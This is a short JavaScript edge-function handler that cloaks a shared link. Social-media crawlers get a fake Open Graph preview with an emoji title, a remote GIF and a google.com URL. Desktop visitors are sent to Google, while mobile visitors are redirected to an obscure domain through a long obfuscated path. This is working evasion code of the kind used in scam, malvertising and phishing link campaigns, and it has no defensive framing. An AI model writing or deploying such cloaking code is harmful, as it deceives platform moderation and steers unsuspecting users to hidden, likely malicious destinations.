export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://rxokvgmvyemwgcviwgpz.supabase.co/storage/v1/object/public/fff/WhatsApp%20Image%202026-09-21%20at%2011.19.50%20PM.gif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/cLKBQ-8b7dhYCG/l-wUq8Pszd8oLnw/aqSMf/w45Dil9H9M1z7LJ/-xXaaZ7p4XS8vpB1mpN/QVRwCBpucEbRpaBc/4Ink_SOIr/vI21EdYf/hWBaVWeqa/pts8goCBTwa/_n1C3Q", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
